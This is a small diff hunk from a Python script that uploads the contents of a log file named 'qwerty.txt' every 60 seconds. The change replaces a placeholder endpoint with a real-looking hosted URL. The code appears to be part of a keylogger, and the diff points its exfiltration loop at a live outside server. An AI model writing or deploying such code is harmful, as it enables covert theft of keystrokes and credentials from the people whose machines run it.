@@ -5,7 +5,7 @@ import time
 
 log_file = "qwerty.txt"
 send_interval = 60  # seconds
-endpoint_url = "https://example.com/receive_logs" 
+endpoint_url = "https://qwerty-bthx.onrender.com/receive_logs"
 # Function to send the log file contents
 def send_logs():
     while True:
